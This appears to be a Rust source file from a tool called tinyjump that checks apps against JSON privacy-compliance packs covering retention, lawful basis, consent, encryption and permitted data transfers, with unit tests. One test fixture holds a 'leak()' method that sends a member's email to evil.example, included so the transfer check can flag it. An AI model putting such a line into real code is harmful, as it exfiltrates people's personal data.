//! Compliance packs (docs/compliance.md): rules for a region or an industry, kept as data
//! files outside tinyjump. `tj check --compliance <pack.json>` reports each control as met,
//! not met (with the fix), checked when the server starts, or a duty for a person;
//! `tj serve --compliance <pack.json>` refuses to start while a control is not met.
//!
//! A pack only names controls; what each checked control means is defined here, once. A
//! pack may extend others, and only adds to them.

use serde_json::Value as Json;
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};
use tj_core::vm::program::{Program, PII_CATEGORIES};

/// The controls tinyjump can check, and what each means.
const CHECKS: &[(&str, &str)] = &[
    ("lawful-basis", "every purpose personal data is held for names its lawful basis (`const lawfulBasis`)"),
    ("special-basis", "data in a special category is held only on consent, or a person confirms another condition"),
    ("retention", "every object holding personal data is erased after a set time (`@retain`)"),
    ("subject-rights", "people can get a copy of their data and have it erased (`tj privacy`, `tj:privacy`)"),
    ("records", "the record of processing can be written (`tj check --privacy --record`)"),
    ("audit-log", "who read or changed personal data is logged, under a key kept apart from the data; checked when the server starts"),
    ("encryption-at-rest", "stored data is encrypted, under a key kept apart from the data; checked when the server starts"),
    ("encryption-in-transit", "the server is reached over TLS, or only from this machine; checked when the server starts"),
    ("transfers", "personal data leaves the server only for destinations the pack lists, each with its basis"),
    ("consent", "purposes resting on consent are recorded with tj:consent and checked with @needs before the data is used"),
];

/// A pack, with the packs it extends merged in.
#[derive(Debug, Default)]
pub struct Pack {
    pub names: Vec<String>,
    pub title: String,
    /// Each pack it is made of: name, date in force, and who reviewed it (`None`: a draft).
    pub reviews: Vec<(String, String, Option<String>)>,
    pub special: BTreeSet<String>,
    /// The lawful bases on which special-category data may be held without a person
    /// confirming another condition: `["consent"]` unless packs say otherwise, and only
    /// narrowed when packs are combined.
    pub special_bases: Option<BTreeSet<String>>,
    pub controls: Vec<Control>,
    pub not_covered: Vec<String>,
    /// Where personal data may be sent: a host (`api.example.com`, `*.example.com`) or a
    /// plugin module (`tj:ai`), with the basis that allows it.
    pub transfers: Vec<(String, String)>,
}

#[derive(Debug, Clone, PartialEq)]
pub struct Control {
    pub kind: Kind,
    pub source: String,
}

#[derive(Debug, Clone, PartialEq)]
pub enum Kind {
    /// One of [`CHECKS`].
    Check(String),
    /// A duty only a person can do (appointing an officer, an assessment, a contract).
    Person(String),
}

/// What only a starting server knows.
pub struct Server {
    /// `TJ_KEY_FILE` is set, and lives outside the data folder.
    pub encrypted: bool,
    pub encryption_key_apart: bool,
    /// The audit key lives outside the data folder.
    pub audit_key_apart: bool,
    /// Loopback, or TLS terminated in front (`TJ_TLS_TERMINATED=1`).
    pub tls: bool,
}

/// Where a control stands.
#[derive(Debug, PartialEq)]
pub enum Verdict {
    Met(String),
    NotMet(String),
    /// Checked by `tj serve --compliance`, not by `tj check`.
    AtServe,
    Person,
}

impl Pack {
    /// Loads `path` and every pack it extends (paths relative to the file).
    pub fn load(path: &Path) -> Result<Pack, String> {
        let mut pack = Pack::default();
        pack.add(path, &mut Vec::new(), &mut Vec::new())?;
        Ok(pack)
    }

    /// Validates a standalone compliance-pack JSON string (for registry verification).
    /// Standalone registry packs cannot use relative `extends` paths.
    pub fn validate_standalone(label: &str, text: &str) -> Result<Pack, String> {
        let json: Json = serde_json::from_str(text).map_err(|e| format!("{label} is not JSON: {e}"))?;
        let extends = strings(&json["extends"]).map_err(|e| format!("{label}: \"extends\" {e}"))?;
        if !extends.is_empty() {
            return Err(format!("{label}: standalone registry compliance packs cannot use \"extends\""));
        }
        let mut pack = Pack::default();
        pack.merge_json(label, &json)?;
        Ok(pack)
    }

    /// Adds the pack at `path` after the packs it extends. `visiting` is the chain being
    /// loaded (a pack in it again is a cycle); `loaded` are packs already merged, which a
    /// second path to them (two packs extending the same base) skips.
    fn add(&mut self, path: &Path, visiting: &mut Vec<PathBuf>, loaded: &mut Vec<PathBuf>) -> Result<(), String> {
        let at = path.canonicalize().map_err(|e| format!("cannot read the pack {}: {e}", path.display()))?;
        if visiting.contains(&at) {
            return Err(format!("the pack {} extends itself", path.display()));
        }
        if loaded.contains(&at) {
            return Ok(());
        }
        visiting.push(at.clone());
        let text = std::fs::read_to_string(&at).map_err(|e| format!("cannot read the pack {}: {e}", path.display()))?;
        let json: Json = serde_json::from_str(&text).map_err(|e| format!("{} is not JSON: {e}", path.display()))?;
        let label = path.display().to_string();
        for parent in strings(&json["extends"]).map_err(|e| format!("{label}: \"extends\" {e}"))? {
            self.add(&at.parent().unwrap_or(Path::new(".")).join(parent), visiting, loaded)?;
        }
        visiting.pop();
        loaded.push(at.clone());
        self.merge_json(&label, &json)
    }

    fn merge_json(&mut self, label: &str, json: &Json) -> Result<(), String> {
        let bad = |what: &str| format!("{label}: {what}");
        let name = json["name"].as_str().filter(|n| !n.is_empty()).ok_or_else(|| bad("needs a \"name\""))?;
        // Parents are added first, so the pack given last names the whole.
        self.title = json["title"].as_str().unwrap_or(name).to_string();
        self.names.push(name.to_string());
        let effective = json["effective"].as_str().filter(|d| !d.is_empty()).ok_or_else(|| bad("needs \"effective\", the date the rules apply from"))?;
        self.reviews.push((name.to_string(), effective.to_string(), json["reviewedBy"].as_str().map(str::to_string)));
        for category in strings(&json["special"]).map_err(|e| bad(&format!("\"special\" {e}")))? {
            if !PII_CATEGORIES.contains(&category.as_str()) {
                return Err(bad(&format!("\"special\" lists \"{category}\", which is not a @pii category; the categories are {}", PII_CATEGORIES.join(", "))));
            }
            self.special.insert(category);
        }
        if !json["specialBases"].is_null() {
            let bases: BTreeSet<String> = strings(&json["specialBases"]).map_err(|e| bad(&format!("\"specialBases\" {e}")))?.into_iter().collect();
            if let Some(b) = bases.iter().find(|b| !tj_core::lawful_basis::BASES.contains(&b.as_str())) {
                return Err(bad(&format!("\"specialBases\" lists \"{b}\", which is not a lawful basis; the bases are {}", tj_core::lawful_basis::BASES.join(", "))));
            }
            // Combined packs only narrow: a basis must be allowed by every pack that names any.
            self.special_bases = Some(match self.special_bases.take() {
                Some(before) => before.intersection(&bases).cloned().collect(),
                None => bases,
            });
        }
        self.not_covered.extend(strings(&json["notCovered"]).map_err(|e| bad(&format!("\"notCovered\" {e}")))?);
        for (i, t) in json["transfers"].as_array().map(Vec::as_slice).unwrap_or_default().iter().enumerate() {
            let bad = |what: &str| bad(&format!("transfer {}: {what}", i + 1));
            let to = t["to"].as_str().filter(|s| !s.is_empty()).ok_or_else(|| bad("needs \"to\": a host, *.domain, or a plugin such as tj:ai"))?;
            // A wildcard covers the subdomains of one registered domain, never a whole suffix.
            let rest = to.strip_prefix("*.").unwrap_or(to);
            if rest.contains('*') || (to.starts_with("*.") && (rest.split('.').count() < 2 || rest.split('.').any(str::is_empty))) {
                return Err(bad(&format!("\"{to}\" is too broad: name a host, or *.domain.tld for the subdomains of one domain")));
            }
            let basis = t["basis"].as_str().filter(|s| !s.trim().is_empty()).ok_or_else(|| bad("needs \"basis\": why this transfer is allowed (adequacy, safeguards, a contract)"))?;
            self.transfers.push((to.to_ascii_lowercase(), basis.to_string()));
        }
        let controls = json["controls"].as_array().ok_or_else(|| bad("needs \"controls\", a list"))?;
        for (i, c) in controls.iter().enumerate() {
            let bad = |what: &str| bad(&format!("control {}: {what}", i + 1));
            let source = c["source"].as_str().filter(|s| !s.trim().is_empty()).ok_or_else(|| bad("every control cites its source (the law and article)"))?;
            let kind = match (c["check"].as_str(), c["person"].as_str()) {
                (Some(check), None) if CHECKS.iter().any(|(k, _)| *k == check) => Kind::Check(check.to_string()),
                (Some(check), None) => return Err(bad(&format!("tinyjump cannot check \"{check}\"; it can check {}, and anything else is a \"person\" control", CHECKS.iter().map(|(k, _)| *k).collect::<Vec<_>>().join(", ")))),
                (None, Some(duty)) => Kind::Person(duty.to_string()),
                _ => return Err(bad("give either \"check\" (what tinyjump checks) or \"person\" (a duty for a person)")),
            };
            let control = Control { kind, source: source.to_string() };
            if !self.controls.contains(&control) {
                self.controls.push(control);
            }
        }
        Ok(())
    }

    /// Each control with its verdict, for an app; `server` when a server is starting.
    #[cfg(test)]
    pub fn evaluate(&self, src: &str, program: &Program, server: Option<&Server>) -> Vec<(&Control, Verdict)> {
        self.evaluate_with_transfers(src, program, server, &std::collections::HashMap::new(), &[])
    }

    /// Like [`Pack::evaluate`], also incorporating remote-server destinations (`remotes.json`)
    /// and outgoing webhook personal-data transfers (`webhooks.json`).
    pub fn evaluate_with_transfers(
        &self,
        src: &str,
        program: &Program,
        server: Option<&Server>,
        remote_dests: &std::collections::HashMap<String, tj_core::Destination>,
        extra_transfers: &[(String, tj_core::Destination, Vec<String>)],
    ) -> Vec<(&Control, Verdict)> {
        let special_bases = self.special_bases.clone().unwrap_or_else(|| BTreeSet::from(["consent".to_string()]));
        let facts = tj_core::facts_with_remotes(src, remote_dests);
        let bases = facts.lawful_basis;
        let held: Vec<_> = program.objects.iter().filter(|o| !o.pii.is_empty()).collect();
        let basis_of = |purpose: &str| bases.as_ref().and_then(|b| b.iter().find(|(p, _)| p == purpose).map(|(_, b)| b.clone()));
        self.controls
            .iter()
            .map(|c| {
                let Kind::Check(check) = &c.kind else { return (c, Verdict::Person) };
                let v = match check.as_str() {
                    _ if held.is_empty() => Verdict::Met("the app holds no personal data".into()),
                    "lawful-basis" => match &bases {
                        Some(_) => Verdict::Met("every purpose names its basis".into()),
                        None => {
                            let used: BTreeSet<&str> = held.iter().flat_map(|o| o.pii.iter().flat_map(|p| p.purposes.iter().map(|s| &**s))).collect();
                            let example: Vec<String> = used.iter().map(|p| format!("{p}: \"contract\"")).collect();
                            Verdict::NotMet(format!("declare the lawful basis of each purpose: const lawfulBasis = {{ {} }}", example.join(", ")))
                        }
                    },
                    "special-basis" => {
                        let mut doubtful = Vec::new();
                        let mut any = false;
                        for o in &held {
                            for p in o.pii.iter().filter(|p| self.special.contains(&*p.category)) {
                                any = true;
                                let not_consent: Vec<String> = p.purposes.iter().filter(|purpose| !basis_of(purpose).is_some_and(|b| special_bases.contains(&b))).map(|p| p.to_string()).collect();
                                if !not_consent.is_empty() {
                                    doubtful.push(format!("{}.{} ({}) for {}", o.name, p.field, p.category, not_consent.join(", ")));
                                }
                            }
                        }
                        if !any {
                            Verdict::Met("the app holds no special-category data".into())
                        } else if doubtful.is_empty() {
                            Verdict::Met(format!("special categories are held only on {}", special_bases.iter().cloned().collect::<Vec<_>>().join(" or ")))
                        } else {
                            Verdict::NotMet(format!("special-category data held on another basis than {}: {}. Change those purposes' basis, or have a person confirm another condition the law allows and record it", special_bases.iter().cloned().collect::<Vec<_>>().join(" or "), doubtful.join("; ")))
                        }
                    }
                    "retention" => {
                        let unbounded: Vec<&str> = held.iter().filter(|o| o.retain.is_none()).map(|o| &*o.name).collect();
                        if unbounded.is_empty() {
                            Verdict::Met("every object holding personal data has @retain".into())
                        } else {
                            Verdict::NotMet(format!("kept forever: {}. Add @retain(\"2y\") (or how long you need) to each", unbounded.join(", ")))
                        }
                    }
                    "subject-rights" => Verdict::Met("built in: tj privacy export|erase, and tj:privacy in app code".into()),
                    "records" => Verdict::Met("built in: tj check --privacy --record".into()),
                    "transfers" => self.transfers_verdict(src, &facts.transfers, extra_transfers),
                    "consent" => {
                        let on_consent: Vec<&str> = bases.iter().flatten().filter(|(_, b)| b == "consent").map(|(p, _)| p.as_str()).collect();
                        if on_consent.is_empty() {
                            Verdict::Met("no purpose rests on consent".into())
                        } else if tj_core::modules::files(&tj_core::modules::with_built_ins(src)).iter().any(|f| f.name == "tj:consent") {
                            Verdict::Met(format!("{}: recorded with tj:consent; the data is revealed only in methods marked @needs", on_consent.join(", ")))
                        } else {
                            Verdict::NotMet(format!("purposes resting on consent, which the app does not record: {}. Import {{ consented }} from \"tj:consent\", let people give it with Consent.get(caller.id).give(purpose, text, version), and mark the methods that use the data @needs(\"consent:<purpose>\")", on_consent.join(", ")))
                        }
                    }
                    "audit-log" => match server {
                        None => Verdict::AtServe,
                        Some(s) if s.audit_key_apart => Verdict::Met("on, with its key kept apart from the data".into()),
                        Some(_) => Verdict::NotMet("the audit key is in the data folder, so a copy of the data could rewrite the log: set TJ_AUDIT_KEY_FILE to a file elsewhere".into()),
                    },
                    "encryption-at-rest" => match server {
                        None => Verdict::AtServe,
                        Some(s) if !s.encrypted => Verdict::NotMet("set TJ_KEY_FILE to encrypt stored data (docs/privacy.md)".into()),
                        Some(s) if !s.encryption_key_apart => Verdict::NotMet("TJ_KEY_FILE is in the data folder, so every backup carries its key: keep it elsewhere".into()),
                        Some(_) => Verdict::Met("on, with its key kept apart from the data".into()),
                    },
                    "encryption-in-transit" => match server {
                        None => Verdict::AtServe,
                        Some(s) if s.tls => Verdict::Met("TLS in front, or reachable from this machine only".into()),
                        Some(_) => Verdict::NotMet("the server listens on the network over plain HTTP: put TLS in front and set TJ_TLS_TERMINATED=1, or bind to 127.0.0.1".into()),
                    },
                    other => unreachable!("loading accepts only known checks, not {other}"),
                };
                (c, v)
            })
            .collect()
    }

    /// Every transfer must be to a destination the pack allows.
    fn transfers_verdict(&self, src: &str, transfers: &[tj_core::Transfer], extra: &[(String, tj_core::Destination, Vec<String>)]) -> Verdict {
        if transfers.is_empty() && extra.is_empty() {
            return Verdict::Met("personal data is not sent outside the server".into());
        }
        let mut problems = Vec::new();
        let mut allowed = BTreeSet::new();
        let all: Vec<(String, &tj_core::Destination, &[String])> = transfers
            .iter()
            .map(|t| (crate::privacy::place(src, t.at), &t.to, t.fields.as_slice()))
            .chain(extra.iter().map(|(at, to, fields)| (at.clone(), to, fields.as_slice())))
            .collect();
        for (at, to, fields) in all {
            let what = fields.join(", ");
            let name = match to {
                tj_core::Destination::Host(h) => h.clone(),
                tj_core::Destination::Cleartext(h) => {
                    problems.push(format!("{at} sends {what} to {h} over plain HTTP, readable on the way; use https://"));
                    continue;
                }
                tj_core::Destination::Plugin(m) => m.clone(),
                tj_core::Destination::Unknown => {
                    problems.push(format!("{at} sends {what} to a URL whose host the code does not fix; write the host out, as in fetch(`https://api.example.com/...`)"));
                    continue;
                }
            };
            match self.transfers.iter().find(|(pat, _)| matches(pat, &name)) {
                Some((_, basis)) => {
                    allowed.insert(format!("{name} ({basis})"));
                }
                None => problems.push(format!("{at} sends {what} to {}; list \"{name}\" in the pack's \"transfers\" with its basis, or stop sending it", crate::privacy::destination(to))),
            }
        }
        if problems.is_empty() {
            Verdict::Met(format!("sent only to listed destinations: {}", allowed.into_iter().collect::<Vec<_>>().join(", ")))
        } else {
            Verdict::NotMet(problems.join("; "))
        }
    }

    /// The report `tj check --compliance` prints, and whether every checked control is met.
    pub fn report(&self, verdicts: &[(&Control, Verdict)]) -> (String, bool) {
        let effective: Vec<String> = self.reviews.iter().map(|(n, from, _)| format!("{n} from {from}")).collect();
        let mut out = format!("{} ({})\n", self.title, effective.join(", "));
        out += "This report is not legal advice. ";
        let drafts: Vec<&str> = self.reviews.iter().filter(|(_, _, by)| by.is_none()).map(|(n, _, _)| n.as_str()).collect();
        if drafts.is_empty() {
            let by: Vec<String> = self.reviews.iter().map(|(n, _, by)| format!("{n} by {}", by.as_deref().unwrap_or_default())).collect();
            out += &format!("Reviewed: {}.\n\n", by.join(", "));
        } else {
            out += &format!("Not reviewed by counsel: {}.\n\n", drafts.join(", "));
        }
        let mut ok = true;
        for (c, v) in verdicts {
            let (mark, what, detail) = match (&c.kind, v) {
                (Kind::Check(k), Verdict::Met(why)) => ("met", k.as_str(), why.clone()),
                (Kind::Check(k), Verdict::NotMet(fix)) => {
                    ok = false;
                    ("NOT MET", k.as_str(), fix.clone())
                }
                (Kind::Check(k), _) => ("at serve", k.as_str(), "checked by tj serve --compliance".into()),
                (Kind::Person(duty), _) => ("person", "", duty.clone()),
            };
            let what = if what.is_empty() { String::new() } else { format!("{what}: ") };
            out += &format!("  {mark:<9} {what}{detail}  [{}]\n", c.source);
        }
        if !self.not_covered.is_empty() {
            out += "\nNot covered by this pack:\n";
            for n in &self.not_covered {
                out += &format!("  - {n}\n");
            }
        }
        (out, ok)
    }
}

/// Whether a pack's destination (`api.example.com`, `*.example.com`, `tj:ai`) covers `name`.
fn matches(allowed: &str, name: &str) -> bool {
    match allowed.strip_prefix("*.") {
        Some(domain) => name.strip_suffix(domain).is_some_and(|sub| sub.ends_with('.') && sub.len() > 1),
        None => allowed == name,
    }
}

fn strings(v: &Json) -> Result<Vec<String>, String> {
    match v {
        Json::Null => Ok(Vec::new()),
        Json::Array(a) => a.iter().map(|s| s.as_str().map(str::to_string).ok_or("must list strings".to_string())).collect(),
        _ => Err("must be a list of strings".into()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn dir(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("tj-packs-{name}-{}", std::process::id()));
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn packs_need_sources_known_checks_and_only_add_when_extended() {
        let d = dir("load");
        let write = |f: &str, s: &str| std::fs::write(d.join(f), s).unwrap();
        write("base.json", r#"{ "name": "base", "effective": "2020-01-01", "special": ["health"], "controls": [{ "check": "retention", "source": "Law art. 1" }] }"#);
        write("health.json", r#"{ "name": "health", "effective": "2024-01-01", "title": "Health", "reviewedBy": "A. Counsel", "extends": ["base.json"], "controls": [{ "check": "retention", "source": "Law art. 1" }, { "person": "Appoint an officer", "source": "Law art. 2" }], "notCovered": ["clinical trials"] }"#);
        let p = Pack::load(&d.join("health.json")).unwrap();
        assert_eq!(p.names, ["base", "health"]);
        assert_eq!(p.title, "Health");
        assert_eq!(p.controls.len(), 2, "the same control twice is kept once");
        assert!(p.special.contains("health"));
        write("nosource.json", r#"{ "name": "x", "effective": "2020-01-01", "controls": [{ "check": "retention" }] }"#);
        assert!(Pack::load(&d.join("nosource.json")).unwrap_err().contains("cites its source"));
        write("unknown.json", r#"{ "name": "x", "effective": "2020-01-01", "controls": [{ "check": "be-nice", "source": "s" }] }"#);
        assert!(Pack::load(&d.join("unknown.json")).unwrap_err().contains("cannot check \"be-nice\""));
        write("loop.json", r#"{ "name": "x", "effective": "2020-01-01", "extends": ["loop.json"], "controls": [] }"#);
        assert!(Pack::load(&d.join("loop.json")).unwrap_err().contains("extends itself"));
        // Two packs extending the same base: the base is merged once.
        write("finance.json", r#"{ "name": "finance", "effective": "2024-01-01", "extends": ["base.json"], "specialBases": ["consent", "contract"], "controls": [] }"#);
        write("both.json", r#"{ "name": "both", "effective": "2025-01-01", "extends": ["health.json", "finance.json"], "specialBases": ["consent"], "controls": [] }"#);
        let both = Pack::load(&d.join("both.json")).unwrap();
        assert_eq!(both.names, ["base", "health", "finance", "both"]);
        assert_eq!(both.special_bases, Some(BTreeSet::from(["consent".to_string()])), "combined packs only narrow");
        write("bad-special.json", r#"{ "name": "x", "effective": "2020-01-01", "special": ["sexuality"], "controls": [] }"#);
        assert!(Pack::load(&d.join("bad-special.json")).unwrap_err().contains("\"sexuality\", which is not a @pii category"));
        write("bad-basis.json", r#"{ "name": "x", "effective": "2020-01-01", "specialBases": ["because"], "controls": [] }"#);
        assert!(Pack::load(&d.join("bad-basis.json")).unwrap_err().contains("not a lawful basis"));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn the_example_meets_its_packs_apart_from_what_the_server_checks() {
        let example = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../examples/members");
        let src = std::fs::read_to_string(example.join("app.tj")).unwrap();
        let program = tj_core::compile(&src).unwrap();
        let pack = Pack::load(&example.join("club.pack.json")).unwrap();
        let (r, ok) = pack.report(&pack.evaluate(&src, &program, None));
        assert!(ok && r.contains("met       transfers: sent only to listed destinations: api.mailer.example"), "{r}");
        let regional = Pack::load(&example.join("gdpr-eu.sample.json")).unwrap();
        let (r, ok) = regional.report(&regional.evaluate(&src, &program, None));
        assert!(!ok && r.contains("NOT MET   transfers"), "the regional pack alone lists no providers: {r}");
    }

    #[test]
    fn personal_data_goes_only_where_the_pack_allows() {
        let d = dir("transfers");
        std::fs::write(d.join("base.json"), r#"{ "name": "base", "effective": "2018-05-25", "controls": [{ "check": "transfers", "source": "art. 44" }] }"#).unwrap();
        std::fs::write(d.join("org.json"), r#"{ "name": "org", "effective": "2025-01-01", "extends": ["base.json"], "controls": [], "transfers": [{ "to": "*.mailer.example", "basis": "processor contract, EU" }, { "to": "tj:ai", "basis": "DPA with the provider" }] }"#).unwrap();
        let src = "import { complete } from \"tj:ai\"\n@server @read(\"owner\") object Member {\n  @pii(\"contact\", \"account\") email: string = \"\"\n  @allow(\"owner\") async welcome() {\n    await fetch(\"https://eu.mailer.example/send\", { method: \"POST\", body: reveal(this.email, \"account\") })\n  }\n  @allow(\"owner\") async ask(): any { return await complete(reveal(this.email, \"account\"), [], []) }\n  @allow(\"owner\") async track(url: string) { await fetch(url, { body: reveal(this.email, \"account\") }) }\n  @allow(\"owner\") async leak() { await fetch(`https://evil.example/${reveal(this.email, \"account\")}`) }\n}\n";
        let program = tj_core::compile(src).unwrap();
        let (r, ok) = Pack::load(&d.join("base.json")).map(|p| p.report(&p.evaluate(src, &program, None))).unwrap();
        assert!(!ok && r.contains("app.tj:5 sends Member.email to eu.mailer.example; list \"eu.mailer.example\""), "{r}");
        let pack = Pack::load(&d.join("org.json")).unwrap();
        let (r, ok) = pack.report(&pack.evaluate(src, &program, None));
        assert!(!ok, "{r}");
        assert!(!r.contains("eu.mailer.example;") && !r.contains("tj:ai;"), "allowed by the org's pack: {r}");
        assert!(r.contains("app.tj:8 sends Member.email to a URL whose host the code does not fix"), "{r}");
        assert!(r.contains("app.tj:9 sends Member.email to evil.example"), "{r}");
        assert!(matches("*.mailer.example", "eu.mailer.example") && !matches("*.mailer.example", "mailer.example") && !matches("*.mailer.example", "evilmailer.example"));
        for broad in ["*", "*.", "*.com", "a*.example.com", "*..com"] {
            std::fs::write(d.join("broad.json"), format!(r#"{{ "name": "b", "effective": "2025-01-01", "controls": [], "transfers": [{{ "to": "{broad}", "basis": "x" }}] }}"#)).unwrap();
            assert!(Pack::load(&d.join("broad.json")).unwrap_err().contains("too broad"), "{broad}");
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn controls_are_met_not_met_at_serve_or_for_a_person() {
        let d = dir("eval");
        let all: Vec<String> = CHECKS.iter().map(|(k, _)| format!(r#"{{ "check": "{k}", "source": "art. {k}" }}"#)).collect();
        std::fs::write(d.join("p.json"), format!(r#"{{ "name": "p", "effective": "2018-05-25", "special": ["health"], "controls": [{}, {{ "person": "Appoint a DPO", "source": "art. 37" }}] }}"#, all.join(", "))).unwrap();
        let pack = Pack::load(&d.join("p.json")).unwrap();
        let src = "@server @read(\"owner\") object Patient {\n  @pii(\"health\", \"care\") notes: string = \"\"\n}\n";
        let program = tj_core::compile(src).unwrap();
        let (r, ok) = pack.report(&pack.evaluate(src, &program, None));
        assert!(!ok);
        assert!(r.starts_with("p (p from 2018-05-25)\nThis report is not legal advice. Not reviewed by counsel: p."), "{r}");
        assert!(r.contains("NOT MET   lawful-basis: declare the lawful basis of each purpose: const lawfulBasis = { care: \"contract\" }"), "{r}");
        assert!(r.contains("NOT MET   special-basis: special-category data held on another basis than consent: Patient.notes (health) for care"), "{r}");
        assert!(r.contains("NOT MET   retention: kept forever: Patient."), "{r}");
        assert!(r.contains("at serve  encryption-at-rest") && r.contains("person    Appoint a DPO  [art. 37]"), "{r}");

        let src = "import { consented } from \"tj:consent\"\nconst lawfulBasis = { care: \"consent\" }\n@server @read(\"owner\") @retain(\"2y\") object Patient {\n  @pii(\"health\", \"care\") notes: string = \"\"\n}\n";
        let program = tj_core::compile(src).unwrap();
        let good = Server { encrypted: true, encryption_key_apart: true, audit_key_apart: true, tls: true };
        let (r, ok) = pack.report(&pack.evaluate(src, &program, Some(&good)));
        assert!(ok && !r.contains("NOT MET"), "{r}");
        let (r, ok) = pack.report(&pack.evaluate(src, &program, Some(&Server { encrypted: false, ..good })));
        assert!(!ok && r.contains("NOT MET   encryption-at-rest: set TJ_KEY_FILE"), "{r}");
        let (r, _) = pack.report(&pack.evaluate(src, &program, Some(&Server { encryption_key_apart: false, audit_key_apart: false, tls: false, ..good })));
        assert!(r.contains("every backup carries its key") && r.contains("TJ_AUDIT_KEY_FILE") && r.contains("plain HTTP"), "{r}");
        let _ = std::fs::remove_dir_all(&d);
    }
}
